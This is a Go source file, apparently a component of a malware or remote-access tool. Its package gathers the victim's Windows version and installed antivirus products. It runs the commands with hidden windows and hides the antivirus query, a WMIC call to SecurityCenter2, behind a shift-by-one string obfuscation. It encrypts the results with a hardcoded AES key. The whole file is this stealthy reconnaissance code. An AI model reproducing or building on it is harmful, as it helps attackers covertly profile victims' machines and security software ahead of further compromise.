package Recolect

import (
	aesgo "github.com/3xploit666/AesGo"
	"os/exec"
	"strings"
	"syscall"
	"unicode"
)

func GetOS() string {
	Info := exec.Command("cmd", "/C", "ver")
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	return stripSpaces(string(aesgo.EncryptAes(string(History), "5345435454535")))
}

func stripSpaces(str string) string {
	return strings.Map(func(r rune) rune {
		if unicode.IsSpace(r) {
			return -1
		}
		return r
	}, str)
}
func DEFOBF(Data string) string {
	var ClearText string
	for i := 0; i < len(Data); i++ {
		ClearText += string(int(Data[i]) - 1)
	}
	return ClearText
}
func GetAntiVirus() string {
	Info := exec.Command("cmd", "/C", DEFOBF("XNJD!0Opef;mpdbmiptu!0Obnftqbdf;]]sppu]TfdvsjuzDfoufs3!Qbui!BoujWjsvtQspevdu!Hfu!ejtqmbzObnf!0Gpsnbu;Mjtu"))
	Info.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	History, _ := Info.Output()

	if strings.Contains(string(History), "=") {
		AV := strings.Split(string(History), "=")
		return stripSpaces(string(AV[1]))
	} else {
		return stripSpaces(string(aesgo.EncryptAes(string(History), "5345435454535")))
	}
}
